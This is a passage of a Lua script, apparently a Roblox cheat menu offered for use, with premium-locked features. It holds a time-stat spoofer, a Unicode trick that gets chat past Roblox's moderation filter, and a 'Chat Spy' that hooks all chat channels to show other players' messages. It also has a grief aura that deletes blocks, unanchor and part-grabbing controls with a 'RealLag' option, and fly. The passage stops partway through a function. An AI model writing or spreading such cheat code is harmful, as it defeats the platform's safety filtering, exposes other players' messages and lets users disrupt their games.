do -- ══ Time Spoofer ══
local FakeTimeGroup = Tabs.Chat:CreateModule({Name = 'Time Spoofer'})

local FakeTimeValue = FakeTimeGroup:CreateSlider({
    Name = 'Fake Time Value',
    Default = 0,
    Min     = 0,
    Max     = 99999,
    Increment = 1
})
local FakeTimeToggle
fakeTimeConn = nil
fakeTimeWatchConn = nil
fakeTimeDescConn = nil
fakeTimeLabelConns = {}
local _fakeTimeAccumulator = 0
local _fakeTimeApplying = false
local _fakeTimeVisualApplying = false

local function _disconnectFakeTimeVisuals()
    if fakeTimeDescConn then
        fakeTimeDescConn:Disconnect()
        fakeTimeDescConn = nil
    end
    for i = #fakeTimeLabelConns, 1, -1 do
        local conn = fakeTimeLabelConns[i]
        if conn then
            conn:Disconnect()
        end
        fakeTimeLabelConns[i] = nil
    end
end

local function _formatFakeTimeText(value)
    local num = tonumber(value) or 0
    if math.abs(num - math.floor(num)) < 0.0001 then
        return tostring(math.floor(num))
    end
    return string.format("%.2f", num):gsub("%.?0+$", "")
end

local function _getTiempoLabels()
    local playerModel = workspace:FindFirstChild(plr.Name)
    if not playerModel then return nil, nil end

    local tiempoGui = playerModel:FindFirstChild("Tiempo", true)
    if not tiempoGui then return nil, nil end

    local text1 = tiempoGui:FindFirstChild("Text1", true)
    local text2 = tiempoGui:FindFirstChild("Text2", true)
    return text1, text2
end

local function _setTiempoLabels(textValue)
    local text1, text2 = _getTiempoLabels()
    _fakeTimeVisualApplying = true
    if text1 and text1:IsA("TextLabel") then
        text1.Text = textValue
    end
    if text2 and text2:IsA("TextLabel") then
        text2.Text = textValue
    end
    _fakeTimeVisualApplying = false
end

local function _applyFakeTimeValue(targetValue)
    local ls = plr:FindFirstChild("leaderstats")
    local tv = ls and ls:FindFirstChild("Time")
    if tv and not _fakeTimeApplying then
        _fakeTimeApplying = true
        pcall(function()
            tv.Value = targetValue
        end)
        _fakeTimeApplying = false
    end
    pcall(_setTiempoLabels, _formatFakeTimeText(targetValue))
end

local function _hookFakeTimeVisuals()
    _disconnectFakeTimeVisuals()

    local function bindLabel(label)
        if not (label and label:IsA("TextLabel")) then return end
        table.insert(fakeTimeLabelConns, label:GetPropertyChangedSignal("Text"):Connect(function()
            if FakeTimeToggle and FakeTimeToggle.Value and not _fakeTimeVisualApplying then
                task.defer(_applyFakeTimeValue, FakeTimeValue.Value)
            end
        end))
    end

    local text1, text2 = _getTiempoLabels()
    bindLabel(text1)
    if text2 ~= text1 then
        bindLabel(text2)
    end

    fakeTimeDescConn = workspace.DescendantAdded:Connect(function(desc)
        if not (FakeTimeToggle and FakeTimeToggle.Value) then return end
        local descName = desc and desc.Name or ""
        if descName == plr.Name or descName == "Tiempo" or descName == "Text1" or descName == "Text2" then
            task.defer(function()
                if not (FakeTimeToggle and FakeTimeToggle.Value) then return end
                _hookFakeTimeVisuals()
                _applyFakeTimeValue(FakeTimeValue.Value)
            end)
        end
    end)
end

local function _syncRealTimeVisual()
    local ls = plr:FindFirstChild("leaderstats")
    local tv = ls and ls:FindFirstChild("Time")
    if tv then
        pcall(_setTiempoLabels, _formatFakeTimeText(tv.Value))
    end
end

local function _stopFakeTimeSpoof()
    if fakeTimeConn then
        fakeTimeConn:Disconnect()
        fakeTimeConn = nil
    end
    if fakeTimeWatchConn then
        fakeTimeWatchConn:Disconnect()
        fakeTimeWatchConn = nil
    end
    _disconnectFakeTimeVisuals()
    _fakeTimeAccumulator = 0
    _syncRealTimeVisual()
end

local function _startFakeTimeSpoof()
    _stopFakeTimeSpoof()
    _hookFakeTimeVisuals()
    _applyFakeTimeValue(FakeTimeValue.Value)

    local ls = plr:FindFirstChild("leaderstats")
    local tv = ls and ls:FindFirstChild("Time")
    if tv then
        fakeTimeWatchConn = tv:GetPropertyChangedSignal("Value"):Connect(function()
            if FakeTimeToggle.Value then
                task.defer(_applyFakeTimeValue, FakeTimeValue.Value)
            else
                task.defer(_syncRealTimeVisual)
            end
        end)
    end

    fakeTimeConn = RunService.Heartbeat:Connect(function(dt)
        _fakeTimeAccumulator = _fakeTimeAccumulator + dt
        if _fakeTimeAccumulator < 0.1 then return end
        _fakeTimeAccumulator = 0
        _applyFakeTimeValue(FakeTimeValue.Value)
    end)
end

FakeTimeToggle = FakeTimeGroup:CreateToggle({
    Name = 'Enable Fake Time',
    Default = false,
    Tooltip = 'Overwrite your visible Time leaderstat locally'
})

FakeTimeToggle:OnChanged(function()
    if FakeTimeToggle.Value then
        _startFakeTimeSpoof()
        Library:Notify("Fake Time active: " .. FakeTimeValue.Value, 3)
    else
        _stopFakeTimeSpoof()
        Library:Notify("Fake Time disabled", 2)
    end
end)

FakeTimeValue:OnChanged(function()
    if FakeTimeToggle.Value then
        _applyFakeTimeValue(FakeTimeValue.Value)
        Library:Notify("Fake Time updated: " .. FakeTimeValue.Value, 2)
    end
end)

local DecimalDonateMode = FakeTimeGroup:CreateDropdown({
    List = {
        "Random",
        "Others",
        "Everyone"
    },
    Default = 1,
    Name = 'Decimal Donate Target',
    Tooltip = 'Who to send your decimal time to'
})

local CleanDecimalTimeButton = FakeTimeGroup:CreateButton({
    Name = 'Clean Decimal Time',
    Function = _requirePremium(function()
        local ls = plr:FindFirstChild("leaderstats")
        if not ls then Library:Notify("leaderstats not found", 3) return end
        local tv = ls:FindFirstChild("Time")
        if not tv then Library:Notify("Time stat not found", 3) return end

        local currentVal = tv.Value
        local decimalPart = currentVal - math.floor(currentVal)
        if decimalPart < 0.0001 then
            Library:Notify("No decimal time detected", 3)
            return
        end

        local mode = DecimalDonateMode.Value
        local targets = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= plr then table.insert(targets, p) end
        end

        if #targets == 0 then Library:Notify("No valid targets in server", 3) return end

        local chatChannel = getGeneralTextChannel()
        if not chatChannel then
            Library:Notify("General chat channel unavailable", 3)
            return
        end
        local formattedDec = string.format("%.2f", decimalPart)
        if tonumber(formattedDec) == 0 then
            formattedDec = string.format("%.4f", decimalPart)
        end
        if tonumber(formattedDec) == 0 then
            formattedDec = string.format("%.6f", decimalPart)
        end

        local function doDonate(target)
            local name = sanitizename(target.Name)
            sendGeneralChatMessage(";donate " .. formattedDec .. " " .. name)
            task.wait(0.5)
            local newDec = tv.Value - math.floor(tv.Value)
            if newDec > 0.0001 then
                local retryDec = string.format("%.6f", newDec)
                sendGeneralChatMessage(";donate " .. retryDec .. " " .. name)
                task.wait(0.5)
            end
        end

        task.spawn(function()
            if mode == "Random" then
                local target = targets[math.random(1, #targets)]
                doDonate(target)
                local finalDec = tv.Value - math.floor(tv.Value)
                if finalDec < 0.0001 then
                    Library:Notify("Decimal cleaned -> " .. target.Name, 3)
                else
                    Library:Notify("Partial clean (remaining: " .. string.format("%.4f", finalDec) .. ")", 4)
                end
            else
                local cleaned = false
                for _, target in ipairs(targets) do
                    local curDec = tv.Value - math.floor(tv.Value)
                    if curDec < 0.0001 then cleaned = true; break end
                    doDonate(target)
                    task.wait(0.6)
                end
                local finalDec = tv.Value - math.floor(tv.Value)
                if finalDec < 0.0001 then
                    Library:Notify("Decimal cleaned -> " .. #targets .. " players", 3)
                else
                    Library:Notify("Partial clean (remaining: " .. string.format("%.4f", finalDec) .. ")", 4)
                end
            end
        end)
    end)
})
registerPremiumButtonLock(CleanDecimalTimeButton, 'Clean Decimal Time', {
    subtitleText = 'Premium utility',
    helperText = 'Tap for premium',
})

AntiDumb = ChatGroup:CreateTextBox({
    Default = '',
    Name = 'Text to speak:',
    PlaceholderText = 'Enter text for anti dumb...',
    Tooltip = 'Prevents chat appearing as "EEEE"'
})

local y = {
    ["A"] = "\u{FF21}",
    ["B"] = "\u{FF22}",
    ["C"] = "\u{FF23}",
    ["D"] = "\u{FF24}",
    ["E"] = "\u{FF25}",
    ["F"] = "\u{FF26}",
    ["G"] = "\u{FF27}",
    ["H"] = "\u{FF28}",
    ["I"] = "\u{FF29}",
    ["J"] = "\u{FF2A}",
    ["K"] = "\u{FF2B}",
    ["L"] = "\u{FF2C}",
    ["M"] = "\u{FF2D}",
    ["N"] = "\u{FF2E}",
    ["O"] = "\u{FF2F}",
    ["P"] = "\u{FF30}",
    ["Q"] = "\u{FF31}",
    ["R"] = "\u{FF32}",
    ["S"] = "\u{FF33}",
    ["T"] = "\u{FF34}",
    ["U"] = "\u{FF35}",
    ["V"] = "\u{FF36}",
    ["W"] = "\u{FF37}",
    ["X"] = "\u{FF38}",
    ["Y"] = "\u{FF39}",
    ["Z"] = "\u{FF3A}",
    ["a"] = "\u{FF41}",
    ["b"] = "\u{FF42}",
    ["c"] = "\u{FF43}",
    ["d"] = "\u{FF44}",
    ["e"] = "\u{FF45}",
    ["f"] = "\u{FF46}",
    ["g"] = "\u{FF47}",
    ["h"] = "\u{FF48}",
    ["i"] = "\u{FF49}",
    ["j"] = "\u{FF4A}",
    ["k"] = "\u{FF4B}",
    ["l"] = "\u{FF4C}",
    ["m"] = "\u{FF4D}",
    ["n"] = "\u{FF4E}",
    ["o"] = "\u{FF4F}",
    ["p"] = "\u{FF50}",
    ["q"] = "\u{FF51}",
    ["r"] = "\u{FF52}",
    ["s"] = "\u{FF53}",
    ["t"] = "\u{FF54}",
    ["u"] = "\u{FF55}",
    ["v"] = "\u{FF56}",
    ["w"] = "\u{FF57}",
    ["x"] = "\u{FF58}",
    ["y"] = "\u{FF59}",
    ["z"] = "\u{FF5A}",
    [" "] = "\u{0020}\u{0020}"
}

ChatGroup:CreateButton({
    Name = 'Bypass EEEE Chat',
    Function = function()
        if AntiDumb.Value and AntiDumb.Value ~= "" then
            local normalchars = true
            local tbtext = AntiDumb.Value
            local fstext = ""
            for i=1,string.len(tbtext) do
                local sub = string.sub(tbtext,i,i)
                local char = y[string.sub(tbtext,i,i)]
                if char then
                    fstext = fstext..char
                else
                    fstext = fstext..string.sub(tbtext,i,i)
                end
            end
            sendGeneralChatMessage(fstext)
        end
    end
})

local function rememberChatSpyMessage(channelName, message)
    local messageId = tostring(message and message.MessageId or "")
    local sourceId = tostring(message and message.TextSource and message.TextSource.UserId or 0)
    local rawText = tostring(message and message.Text or "")
    local key = channelName .. "|" .. (messageId ~= "" and messageId or (sourceId .. "|" .. rawText))
    local now = tick()
    for seenKey, seenAt in pairs(chatSpySeenMessages) do
        if now - seenAt > 12 then
            chatSpySeenMessages[seenKey] = nil
        end
    end
    if chatSpySeenMessages[key] then
        return false
    end
    chatSpySeenMessages[key] = now
    return true
end

local function emitChatSpySystemMessage(channelName, displayName, userName, rawText, colorHex, extras)
    pcall(function()
        local generalChannel = getGeneralTextChannel()
        if not generalChannel then return end
        local channelPrefix = channelName ~= "RBXGeneral" and channelName ~= "" and ("[" .. escapeRichText(channelName) .. "] ") or ""
        generalChannel:DisplaySystemMessage(string.format(
            "<font color='%s'>[Spy] %s%s (@%s)%s: %s</font>",
            colorHex,
            channelPrefix,
            escapeRichText(displayName or userName or "?"),
            escapeRichText(userName or displayName or "?"),
            escapeRichText(extras or ""),
            escapeRichText(rawText or "")
        ))
    end)
end

local function displayChatSpyMessage(channel, message)
    if not ChatSpyEnabled then return end
    if not channel or not message then return end

    local textSource = message.TextSource
    local sourcePlayer = textSource and Players:GetPlayerByUserId(textSource.UserId)
    if not sourcePlayer then return end

    local channelName = channel.Name or "Chat"
    if not rememberChatSpyMessage(channelName, message) then return end

    local rawText = tostring(message.Text or "")
    local colorName, extras = getChatSpyMeta(sourcePlayer, rawText)
    local colorHex = namecolorshex[colorName] or "#FFFFFF"
    emitChatSpySystemMessage(channelName, sourcePlayer.DisplayName, sourcePlayer.Name, rawText, colorHex, extras)
end

local function displayLegacyChatSpyMessage(messageData)
    if not ChatSpyEnabled or type(messageData) ~= "table" then return end

    local rawText = tostring(messageData.Message or messageData.Text or messageData.Content or "")
    local speakerName = tostring(messageData.FromSpeaker or messageData.SpeakerName or messageData.From or "")
    if rawText == "" or speakerName == "" then return end

    local sourcePlayer = Players:FindFirstChild(speakerName)
    local channelName = tostring(messageData.OriginalChannel or messageData.Channel or "RBXGeneral")
    if channelName == "" or channelName == "All" then
        channelName = "RBXGeneral"
    end

    if not rememberChatSpyMessage(channelName, {
        MessageId = messageData.MessageId or messageData.ID or (speakerName .. "|" .. rawText),
        Text = rawText,
        TextSource = sourcePlayer and { UserId = sourcePlayer.UserId } or nil,
    }) then
        return
    end

    local colorName, extras = getChatSpyMeta(sourcePlayer, rawText)
    local colorHex = namecolorshex[colorName] or "#FFFFFF"
    emitChatSpySystemMessage(
        channelName,
        sourcePlayer and sourcePlayer.DisplayName or speakerName,
        sourcePlayer and sourcePlayer.Name or speakerName,
        rawText,
        colorHex,
        extras
    )
end

local function hookChatSpyChannel(channel)
    if not channel or not channel:IsA("TextChannel") or chatSpyChannelConnections[channel] then
        return
    end

    chatSpyChannelConnections[channel] = channel.MessageReceived:Connect(function(message)
        displayChatSpyMessage(channel, message)
    end)
end

function startChatSpy()
    setupEnhancedChatSpy()

    if chatSpyChildAddedConn then
        chatSpyChildAddedConn:Disconnect()
        chatSpyChildAddedConn = nil
    end
    if chatSpyGlobalConn then
        chatSpyGlobalConn:Disconnect()
        chatSpyGlobalConn = nil
    end
    if chatSpyLegacyConn then
        chatSpyLegacyConn:Disconnect()
        chatSpyLegacyConn = nil
    end
    for channel, conn in pairs(chatSpyChannelConnections) do
        if conn then
            conn:Disconnect()
        end
        chatSpyChannelConnections[channel] = nil
    end

    local textChannels = getTextChannels()
    if textChannels then
        for _, channel in ipairs(textChannels:GetChildren()) do
            hookChatSpyChannel(channel)
        end
    end

    chatSpyGlobalConn = TextChatService.MessageReceived:Connect(function(message)
        local channel = message and message.TextChannel
        if not channel and textChannels then
            channel = textChannels:FindFirstChild("RBXGeneral")
        end
        displayChatSpyMessage(channel, message)
    end)

    if textChannels then
        chatSpyChildAddedConn = textChannels.ChildAdded:Connect(hookChatSpyChannel)
    end
    local legacyChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    local legacySignal = legacyChatEvents and legacyChatEvents:FindFirstChild("OnMessageDoneFiltering")
    if legacySignal and legacySignal:IsA("RemoteEvent") then
        chatSpyLegacyConn = legacySignal.OnClientEvent:Connect(displayLegacyChatSpyMessage)
    end
    chatSpyConnection = chatSpyChildAddedConn
end

ChatSpyToggle:OnChanged(function(value)
    ChatSpyEnabled = value
    
    if ChatSpyEnabled then
        startChatSpy()
        Library:Notify("Chat Spy enabled - monitoring all messages", 3)
    else
        if chatSpyChildAddedConn then
            chatSpyChildAddedConn:Disconnect()
            chatSpyChildAddedConn = nil
        end
        if chatSpyGlobalConn then
            chatSpyGlobalConn:Disconnect()
            chatSpyGlobalConn = nil
        end
        if chatSpyLegacyConn then
            chatSpyLegacyConn:Disconnect()
            chatSpyLegacyConn = nil
        end
        for channel, conn in pairs(chatSpyChannelConnections) do
            if conn then
                conn:Disconnect()
            end
            chatSpyChannelConnections[channel] = nil
        end
        chatSpyConnection = nil
    end
end)

end -- /══ Time Spoofer ══

do -- ══ Day/Night Cycle ══
local _dnLighting = game:GetService("Lighting")
local _dnCycleConn = nil
local _dnOverrideConn = nil
local _dnCurrentTime = _dnLighting.ClockTime
local _dnSettingTime = false

local DayNightGroup = Tabs.Chat:CreateModule({Name = 'Day/Night Cycle'})

local DayNightSpeed = DayNightGroup:CreateSlider({
    Name = 'Cycle Speed',
    Default = 0.5,
    Min     = 0.1,
    Max     = 5,
    Increment = 1,
    Tooltip = 'In-game hours per real second (0.5 = ~48s full cycle)'
})

local DayNightToggle = DayNightGroup:CreateToggle({
    Name = 'Day/Night Cycle',
    Default = false,
    Tooltip = 'Smoothly cycles day/night overriding the game'
})

DayNightToggle:OnChanged(function()
    if DayNightToggle.Value then
        _dnCurrentTime = _dnLighting.ClockTime

        if _dnOverrideConn then _dnOverrideConn:Disconnect() end
        _dnOverrideConn = _dnLighting:GetPropertyChangedSignal("ClockTime"):Connect(function()
            if not _dnSettingTime then
                _dnSettingTime = true
                _dnLighting.ClockTime = _dnCurrentTime
                _dnSettingTime = false
            end
        end)

        if _dnCycleConn then _dnCycleConn:Disconnect() end
        _dnCycleConn = RunService.Heartbeat:Connect(function(dt)
            _dnCurrentTime = (_dnCurrentTime + dt * DayNightSpeed.Value) % 24
            _dnSettingTime = true
            _dnLighting.ClockTime = _dnCurrentTime
            _dnSettingTime = false
        end)

        Library:Notify("Day/Night cycle ON", 2)
    else
        if _dnCycleConn then _dnCycleConn:Disconnect(); _dnCycleConn = nil end
        if _dnOverrideConn then _dnOverrideConn:Disconnect(); _dnOverrideConn = nil end
        Library:Notify("Day/Night cycle OFF", 2)
    end
end)

end -- /══ Day/Night Cycle ══

do -- ══ Antis Setup ══
AntisGroup = Tabs.Auras:CreateModule({Name = 'Antis'})

AntiVoid = AntisGroup:CreateToggle({
    Name = 'Anti Void',
    Default = false,
    Tooltip = 'Prevent falling into the void'
})

AntiGravity = AntisGroup:CreateToggle({
    Name = 'Anti Gravity',
    Default = false,
    Tooltip = 'Prevent weird gravity amounts'
})

AntiBlind = AntisGroup:CreateToggle({
    Name = 'Anti Blind',
    Default = false,
    Tooltip = 'Prevents blind effects'
})

 AntiDrag = AntisGroup:CreateToggle({
    Name = 'Anti Drag',
    Default = false,
    Tooltip = 'Prevents drag effects'
})

 AntiJail = AntisGroup:CreateToggle({
    Name = 'Anti Jail',
    Default = false,
    Tooltip = 'Prevents jail effects'
})

 AntiVampire = AntisGroup:CreateToggle({
    Name = 'Anti Vampire',
    Default = false,
    Tooltip = 'Prevents vampire/camera manipulation'
})

 AntiFling = AntisGroup:CreateToggle({
    Name = 'Anti Fling',
    Default = false,
    Tooltip = 'Prevents flinging and velocity manipulation'
})

 AntiInvisible = AntisGroup:CreateToggle({
    Name = 'Anti Invisible',
    Default = false,
    Tooltip = 'Detects and prevents invisible character'
})

 AntiToxify = AntisGroup:CreateToggle({
    Name = 'Anti Toxify',
    Default = false,
    Tooltip = 'Removes toxic effects (blur, RGB, fog)'
})

 AntiNoColor = AntisGroup:CreateToggle({
    Name = 'Anti NoColor',
    Default = false,
    Tooltip = 'Prevents color correction effects'
})

 AntiStun = AntisGroup:CreateToggle({
    Name = 'Anti Stun',
    Default = false,
    Tooltip = 'Prevents stun/tackle effects'
})

 AntiFarlands = AntisGroup:CreateToggle({
    Name = 'Anti Farlands',
    Default = false,
    Tooltip = 'Prevents teleportation to far lands'
})

 AntiFreeze = AntisGroup:CreateToggle({
    Name = 'Anti Freeze',
    Default = false,
    Tooltip = 'Prevents freeze effects'
})

 AntiMyopicBlur = AntisGroup:CreateToggle({
    Name = 'Anti Myopic/Blur',
    Default = false,
    Tooltip = 'Prevents blur effects'
})

 AntiFog = AntisGroup:CreateToggle({
    Name = 'Anti Fog',
    Default = false,
    Tooltip = 'Prevents fog effects'
})

 AntiCursed = AntisGroup:CreateToggle({
    Name = 'Anti Cursed',
    Default = false,
    Tooltip = 'Prevents cursed effects'
})

GriefAura:OnChanged(function()
    auraSettings.griefAura.active = GriefAura.Value
    auraSettings.griefAura.range = AuraRange.Value
    auraSettings.griefAura.speed = AuraSpeed.Value
    
    if GriefAura.Value then
        StartAura("griefAura")
        Library:Notify("Grief aura activated - Deleting blocks", 3)
    else
        if auraConnections.griefAura then
            auraConnections.griefAura:Disconnect()
            auraConnections.griefAura = nil
        end
    end
end)

BlockAura:OnChanged(function()
    auraSettings.blockAura.active = BlockAura.Value
    auraSettings.blockAura.range = AuraRange.Value
    auraSettings.blockAura.speed = AuraSpeed.Value
    
    if BlockAura.Value then
        StartAura("blockAura")
        Library:Notify("Block aura activated - Building blocks", 3)
    else
        if auraConnections.blockAura then
            auraConnections.blockAura:Disconnect()
            auraConnections.blockAura = nil
        end
    end
end)

AntiBlind:OnChanged(function()
    if AntiBlind.Value then
        StartAntiBlind()
        Library:Notify("Anti Blind enabled", 3)
    else
        if antiConnections["Blind"] then
            antiConnections["Blind"]:Disconnect()
            antiConnections["Blind"] = nil
        end
    end
end)

AntiVampire:OnChanged(function()
    if AntiVampire.Value then
        StartAntiVampire()
        Library:Notify("Anti Vampire enabled", 3)
    else
        if antiConnections["Vampire"] then
            antiConnections["Vampire"]:Disconnect()
            antiConnections["Vampire"] = nil
        end
    end
end)

AntiFling:OnChanged(function()
    if AntiFling.Value then
        StartAntiFling()
        Library:Notify("Anti Fling enabled", 3)
    else
        if antiConnections["Fling"] then
            antiConnections["Fling"]:Disconnect()
            antiConnections["Fling"] = nil
        end
    end
end)

AntiInvisible:OnChanged(function()
    if AntiInvisible.Value then
        StartAntiInvisible()
        Library:Notify("Anti Invisible enabled", 3)
    else
        if antiConnections["Invisible"] then
            antiConnections["Invisible"]:Disconnect()
            antiConnections["Invisible"] = nil
        end
    end
end)

AntiToxify:OnChanged(function()
    if AntiToxify.Value then
        StartAntiToxify()
        Library:Notify("Anti Toxify enabled", 3)
    else
        for _, k in ipairs({"Toxify", "ToxifyChar"}) do
            if antiConnections[k] then
                antiConnections[k]:Disconnect()
                antiConnections[k] = nil
            end
        end
    end
end)

AntiNoColor:OnChanged(function()
    if AntiNoColor.Value then
        StartAntiNoColor()
        Library:Notify("Anti NoColor enabled", 3)
    else
        if antiConnections["NoColor"] then
            antiConnections["NoColor"]:Disconnect()
            antiConnections["NoColor"] = nil
        end
    end
end)

AntiStun:OnChanged(function()
    if AntiStun.Value then
        StartAntiStun()
        Library:Notify("Anti Stun enabled", 3)
    else
        if antiConnections["Stun"] then
            antiConnections["Stun"]:Disconnect()
            antiConnections["Stun"] = nil
        end
    end
end)

AntiFarlands:OnChanged(function()
    if AntiFarlands.Value then
        StartAntiFarlands()
        Library:Notify("Anti Farlands enabled", 3)
    else
        if antiConnections["Farlands"] then
            antiConnections["Farlands"]:Disconnect()
            antiConnections["Farlands"] = nil
        end
    end
end)

AntiDrag:OnChanged(function()
    if AntiDrag.Value then
        StartAntiDrag()
        Library:Notify("Anti Drag enabled", 3)
    else
        if antiConnections["Drag"] then
            antiConnections["Drag"]:Disconnect()
            antiConnections["Drag"] = nil
        end
    end
end)

AntiJail:OnChanged(function()
    if AntiJail.Value then
        StartAntiJail()
        Library:Notify("Anti Jail enabled", 3)
    else
        if antiConnections["Jail"] then
            antiConnections["Jail"]:Disconnect()
            antiConnections["Jail"] = nil
        end
    end
end)

AntiFreeze:OnChanged(function()
    if AntiFreeze.Value then
        StartAntiFreeze()
        Library:Notify("Anti Freeze enabled", 3)
    else
        if antiConnections["Freeze"] then
            antiConnections["Freeze"]:Disconnect()
            antiConnections["Freeze"] = nil
        end
        if antiConnections["FreezeRespawn"] then
            antiConnections["FreezeRespawn"]:Disconnect()
            antiConnections["FreezeRespawn"] = nil
        end
    end
end)

AntiMyopicBlur:OnChanged(function()
    if AntiMyopicBlur.Value then
        StartAntiMyopicBlur()
        Library:Notify("Anti Myopic/Blur enabled", 3)
    else
        if antiConnections["MyopicBlur"] then
            antiConnections["MyopicBlur"]:Disconnect()
            antiConnections["MyopicBlur"] = nil
        end
    end
end)
local _muteBoomboxConn = nil
MuteBoomboxesToggle:OnChanged(function(value)
    muteBoomboxesEnabled = value

    local function findBoomboxes()
        local results = {}
        -- Tools are direct children of workspace or in player characters/backpacks
        for _, child in ipairs(workspace:GetChildren()) do
            if child:IsA("Tool") and boomboxNames[child.Name] then
                results[#results+1] = child
            end
        end
        -- Also check player characters
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Character then
                for _, child in ipairs(p.Character:GetChildren()) do
                    if child:IsA("Tool") and boomboxNames[child.Name] then
                        results[#results+1] = child
                    end
                end
            end
            if p:FindFirstChild("Backpack") then
                for _, child in ipairs(p.Backpack:GetChildren()) do
                    if child:IsA("Tool") and boomboxNames[child.Name] then
                        results[#results+1] = child
                    end
                end
            end
        end
        return results
    end

    if value then
        for _, tool in ipairs(findBoomboxes()) do
            local sound = tool:FindFirstChild("Sound", true)
            if sound then sound.Volume = 0 end
        end

        if _muteBoomboxConn then _muteBoomboxConn:Disconnect() end
        _muteBoomboxConn = workspace.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Tool") and boomboxNames[descendant.Name] and muteBoomboxesEnabled then
                local sound = descendant:FindFirstChild("Sound", true)
                if sound then sound.Volume = 0 end
            end
        end)

        Library:Notify("All boomboxes muted", 3)
    else
        if _muteBoomboxConn then
            _muteBoomboxConn:Disconnect()
            _muteBoomboxConn = nil
        end

        for _, tool in ipairs(findBoomboxes()) do
            local sound = tool:FindFirstChild("Sound", true)
            if sound then sound.Volume = 1 end
        end
    end
end)

AntiFog:OnChanged(function()
    if AntiFog.Value then
        StartAntiFog()
        Library:Notify("Anti Fog enabled", 3)
    else
        if antiConnections["Fog"] then
            antiConnections["Fog"]:Disconnect()
            antiConnections["Fog"] = nil
        end
    end
end)

AntiCursed:OnChanged(function()
    if AntiCursed.Value then
        StartAntiCursed()
        Library:Notify("Anti Cursed enabled", 3)
    else
        if antiConnections["Cursed"] then
            antiConnections["Cursed"]:Disconnect()
            antiConnections["Cursed"] = nil
        end
    end
end)

local _rainbowAuraGuard = false
RainbowAura:OnChanged(function()
    if _rainbowAuraGuard then return end
    if not isOwner and not isPremium then
        if RainbowAura.Value then
            _rainbowAuraGuard = true
            RainbowAura:SetValue(false)
            _rainbowAuraGuard = false
            _showPremiumPopup()
        end
        return
    end
    auraSettings.rainbowAura.active = RainbowAura.Value
    auraSettings.rainbowAura.range = AuraRange.Value
    auraSettings.rainbowAura.speed = AuraSpeed.Value

    if RainbowAura.Value then
        StartAura("rainbowAura")
        Library:Notify("Rainbow aura activated", 3)
    else
        if auraConnections.rainbowAura then
            auraConnections.rainbowAura:Disconnect()
            auraConnections.rainbowAura = nil
        end
    end
end)

ToxicAura:OnChanged(function()
    auraSettings.toxicAura.active = ToxicAura.Value
    auraSettings.toxicAura.range = AuraRange.Value
    auraSettings.toxicAura.speed = AuraSpeed.Value
    
    if ToxicAura.Value then
        StartAura("toxicAura")
        Library:Notify("Toxic aura activated", 3)
    else
        if auraConnections.toxicAura then
            auraConnections.toxicAura:Disconnect()
            auraConnections.toxicAura = nil
        end
    end
end)

SignAura:OnChanged(function()
    auraSettings.signAura.active = SignAura.Value
    auraSettings.signAura.range = AuraRange.Value
    auraSettings.signAura.speed = AuraSpeed.Value
    
    if SignAura.Value then
        StartAura("signAura")
        Library:Notify("Sign aura activated", 3)
    else
        if auraConnections.signAura then
            auraConnections.signAura:Disconnect()
            auraConnections.signAura = nil
        end
    end
end)

AnchorAura:OnChanged(function()
    auraSettings.anchorAura.active = AnchorAura.Value
    auraSettings.anchorAura.range = AuraRange.Value
    auraSettings.anchorAura.speed = AuraSpeed.Value
    
    if AnchorAura.Value then
        StartAura("anchorAura")
        Library:Notify("Anchor aura activated", 3)
    else
        if auraConnections.anchorAura then
            auraConnections.anchorAura:Disconnect()
            auraConnections.anchorAura = nil
        end
    end
end)

UnanchorAura:OnChanged(function()
    auraSettings.unanchorAura.active = UnanchorAura.Value
    auraSettings.unanchorAura.range = AuraRange.Value
    auraSettings.unanchorAura.speed = AuraSpeed.Value
    
    if UnanchorAura.Value then
        StartAura("unanchorAura")
        Library:Notify("Unanchor aura activated", 3)
    else
        if auraConnections.unanchorAura then
            auraConnections.unanchorAura:Disconnect()
            auraConnections.unanchorAura = nil
        end
    end
end)

FlyEnabled:OnChanged(function()
    flyEnabled = FlyEnabled.Value
    flySpeed = FlySpeed.Value

    if flyEnabled then
        StartFlying()
        Library:Notify("Fly ON — double-jump to lift off, WASD/E/Q to move", 4)
    else
        StopFlying()
    end
end)

FlySpeed:OnChanged(function()
    flySpeed = FlySpeed.Value
end)

AuraRange:OnChanged(function()
    for auraType, settings in pairs(auraSettings) do
        if settings.active then
            settings.range = AuraRange.Value
        end
    end
end)

AuraSpeed:OnChanged(function()
    for auraType, settings in pairs(auraSettings) do
        if settings.active then
            settings.speed = AuraSpeed.Value
        end
    end
end)

AutoPickup:OnChanged(function()
    autoPickupEnabled = AutoPickup.Value
end)

AutoDrop:OnChanged(function()
    autoDropEnabled = AutoDrop.Value
end)

function clearPartRing()

end

AntiVoid:OnChanged(function()
    antiVoidEnabled = AntiVoid.Value
    
    if antiVoidEnabled then
        StartAntiVoid()
        Library:Notify("Anti-Void enabled", 3)
    else
        clearPartRing()
        StopAntiVoid()
    end
end)

AntiGravity:OnChanged(function()
    antiGravityEnabled = AntiGravity.Value
    
    if antiGravityEnabled then
        StartAntiGravity()
        Library:Notify("Anti-Gravity enabled", 3)
    else
        StopAntiGravity()
    end
end)

_pcControllerConn = nil

do -- ══ Parts Controller ══
local _pcActive    = false
local _pcMode      = "origin"
local _pcGrabbed   = {}
local _pcConn      = nil
local _pcAngle     = 0
local _pcWaveT     = 0
local _pcRingSize  = 10
local _pcSpeed     = 10
local _pcAutoRad   = 100
local _pcPickRad   = 500
local _pcEntropy   = false
local _pcRealLag   = false
local _pcRedColor  = false
local _pcAnchor    = false
local _pcChaos     = false
local _pcUseCFrame = false
local _pcNoclip    = false
local _pcAutoGrab  = false

local function _pcRelease()
    for part, data in pairs(_pcGrabbed) do
        pcall(function() data.bp:Destroy() end)
        pcall(function() data.bg:Destroy() end)
    end
    _pcGrabbed = {}
end

local function _pcGrabPart(part)
    if _pcGrabbed[part] then return end
    local bp = Instance.new("BodyPosition")
    bp.MaxForce = Vector3.new(1e9,1e9,1e9)
    bp.D = 500; bp.P = 10000
    bp.Position = part.Position
    bp.Parent = part
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(1e9,1e9,1e9)
    bg.D = 1000; bg.P = 10000
    bg.CFrame = part.CFrame
    bg.Parent = part
    _pcGrabbed[part] = { bp = bp, bg = bg }
end

local function _pcGrabNearby(radius)
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
